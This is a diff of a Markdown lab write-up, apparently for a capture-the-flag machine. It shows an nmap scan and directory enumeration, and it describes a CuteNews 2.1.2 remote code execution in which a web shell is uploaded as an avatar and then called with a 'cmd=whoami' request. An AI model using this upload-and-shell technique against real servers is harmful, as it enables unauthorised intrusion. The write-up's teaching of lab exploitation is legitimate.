@@ -8,11 +8,11 @@ author: H4
 ```bash
 $ nmap -Pn 192.168.55.128
 ```
--> 22 (OpenSSH)
--> 80 (Apache)
--> 88 (Nginx)
--> 110 (pop3)
--> 995 (pop3)
+- 22 (OpenSSH)
+- 80 (Apache)
+- 88 (Nginx)
+- 110 (pop3)
+- 995 (pop3)
 
 ## web application
 - use some kind of dirbuster like gobuster or dirb to identify the `index.php`
@@ -21,10 +21,10 @@ $ nmap -Pn 192.168.55.128
 ---
 
 # exploitation
-- cutenews 2.1.2 is vulnerable to an rce via file upload (https://www.exploit-db.com/exploits/48800)
+```cutenews 2.1.2 is vulnerable to an rce via file upload (https://www.exploit-db.com/exploits/48800)```
 
-1. register a new account
-2. perform an avatar upload to upload a shell
+- register a new account
+- perform an avatar upload to upload a shell
 
 ```http
 POST /index.php HTTP/1.1
@@ -109,7 +109,7 @@ Content-Type: text/html; charset=UTF-8
 ...
 ```
 
-3. execute commands
+- execute commands
 
 ```http
 GET /uploads/avatar_hacker_shell.php?cmd=whoami HTTP/1.1
